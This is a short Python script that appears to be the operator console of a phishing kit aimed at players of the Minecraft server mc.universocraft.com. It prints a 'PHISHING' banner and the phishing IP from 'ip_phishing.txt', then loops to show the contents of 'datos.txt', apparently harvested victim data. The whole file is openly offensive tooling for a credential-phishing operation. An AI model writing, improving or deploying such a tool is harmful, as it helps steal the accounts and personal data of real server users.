###############################
# Consola mc.universocraft.com
###############################

from colorama import *
import platform, sys, socket, os
from time import sleep

init()

so = platform.system()
os.system("title Consola: mc.universocraft.com")
a = 1

rojo = Fore.RED
lrojo = Fore.LIGHTRED_EX
negro = Fore.BLACK
lnegro = Fore.LIGHTBLACK_EX
blanco = Fore.WHITE
verde = Fore.GREEN
lverde = Fore.LIGHTGREEN_EX
lcyan = Fore.LIGHTCYAN_EX
lmagenta = Fore.LIGHTMAGENTA_EX
reset = Fore.RESET

archivo_ip = open("ip_phishing.txt", "r")
ip = archivo_ip.read()
archivo_ip.close()

def banner():
    print("")
    print("")
    print(lrojo + "    ██▓███   ██░ ██  ██▓  ██████  ██░ ██  ██▓ ███▄    █   ▄████ ")
    print("    ▓██░  ██▒▓██░ ██▒▓██▒▒██    ▒ ▓██░ ██▒▓██▒ ██ ▀█   █  ██▒ ▀█▒")
    print("    ▓██░ ██▓▒▒██▀▀██░▒██▒░ ▓██▄   ▒██▀▀██░▒██▒▓██  ▀█ ██▒▒██░▄▄▄░")
    print(blanco + "    ▒██▄█▓▒ ▒░▓█ ░██ ░██░  ▒   ██▒░▓█ ░██ ░██░▓██▒  ▐▌██▒░▓█  ██▓")
    print("    ▒██▒ ░  ░░▓█▒░██▓░██░▒██████▒▒░▓█▒░██▓░██░▒██░   ▓██░░▒▓███▀▒")
    print("    ▒▓▒░ ░  ░ ▒ ░░▒░▒░▓  ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ ")
    print("    ░▒ ░      ▒ ░▒░ ░ ▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░ ▒ ░░ ░░   ░ ▒░  ░   ░ ")
    print("    ░░        ░  ░░ ░ ▒ ░░  ░  ░   ░  ░░ ░ ▒ ░   ░   ░ ░ ░ ░   ░ ")
    print("            ░  ░  ░ ░        ░   ░  ░  ░ ░           ░       ░ ")
    print("")
    print("")
    
def consola():
    banner()
    while a <= 2:
        sleep(3)
        os.system("cls")
        banner()
        print(blanco + "    [" + verde + "√" + blanco + "]" + blanco + " IP: " + lrojo + ip)
        print(lverde + "")
        os.system("type datos.txt")


consola()
